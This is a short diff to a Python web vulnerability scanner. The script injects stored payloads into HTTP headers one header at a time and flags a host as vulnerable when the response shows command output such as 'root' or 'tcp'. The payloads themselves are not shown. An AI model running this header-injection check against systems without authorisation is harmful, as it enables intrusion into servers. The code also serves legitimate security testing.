@@ -26,18 +26,17 @@ allClear = ' does not appear VULNERABLE.'
 for each in user_agents:
     query = o.scheme + '://' + o.netloc + o.path
     for heads in http_headers:
-        print(heads)
-        results = requests.get(query, headers={'User-Agent':user_agents[each],'Cookie':user_agents[each],'Referer':user_agents[each],'Host':user_agents[each],})
+        results = requests.get(query, headers={heads:user_agents[each]})
         soup = BeautifulSoup(results.text)
         match = str(soup.body.p)
         if (len(match)!= 0) or match != 'None':
             if 'tcp' in match:
                 print ('Host: ' + query + confirm)
-                print ('Payload: ' + user_agents[each])
+                print ('Payload: ' + heads + ':' + user_agents[each])
                 print(match[314:704])
             elif 'root' in match:
                 print ('Host: ' + query + confirm)
-                print ('Payload: ' + user_agents[each])
+                print ('Payload: ' + heads + ':' + user_agents[each])
                 print(match[3:35])
             else:
                 print(match)
